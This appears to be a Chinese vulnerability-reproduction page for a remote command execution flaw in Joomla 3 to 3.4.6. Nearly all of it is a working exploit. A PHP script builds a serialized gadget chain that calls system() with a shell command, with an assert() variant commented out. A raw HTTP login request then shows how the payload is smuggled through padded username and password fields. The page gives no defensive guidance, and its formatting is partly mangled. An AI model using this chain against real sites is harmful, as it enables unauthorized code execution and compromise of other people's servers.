# Joomla 3-3.4.6 远程命令执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2995](https://www.zhihuifly.com/t/topic/2995)

# Joomla 3-3.4.6 远程命令执行漏洞

## 一、漏洞简介

## 二、漏洞影响

Joomla 3-3.4.6

PHP < 5.6.13

## 三、复现过程

```
<?php

class JSimplepieFactory {}

class JDatabaseDriverMysql {}

class SimplePie

{

var $feed_url;

var $cache;

var $sanitize;

var $cache_name_function;

```
public function __construct($feed_url, $cache, $sanitize, $cache_name_function)
{
    $this-&gt;feed_url = $feed_url;
    $this-&gt;cache = $cache;
    $this-&gt;sanitize = $sanitize;
    $this-&gt;cache_name_function = $cache_name_function;
} 
```

}

class JDatabaseDriverMysqli

{

protected $obj;

protected $connection;

protected $disconnectHandlers = array();

```
public function __construct($obj, $connection, $disconnectHandlers)
{
    $this-&gt;obj = $obj;
    $this-&gt;connection = $connection;
    $this-&gt;disconnectHandlers = $disconnectHandlers;
} 
```

}

$function = ‘system’;

$argument = ‘[http://www.0-sec.org](http://www.0-sec.org);id’;

// $function = ‘assert’;

// $argument = ‘phpinfo() || “[http://www.0-sec.org](http://www.0-sec.org)”’;

$simplepie = new SimplePie($argument, true, new JDatabaseDriverMysql(), $function);

$jdatabasedrivermysqli = new JDatabaseDriverMysqli(new JSimplepieFactory(), true, array(array($simplepie,‘init’)));

echo urlencode(serialize($jdatabasedrivermysqli)); `?>` 
```

```
POST /Joomla/ HTTP/1.1
Host: www.0-sec.org:8000
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: XDEBUG_SESSION=PHPSTORM; 17511585a4996c48455fa590ab8d4d24=58c7q9ocb6n3q0tjj7m0s3g3i6
Content-Length: 737

CSRF-Token值=1&task=user.login&option=com_users&username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&password=AAA";s:3:"233":序列化payload 
```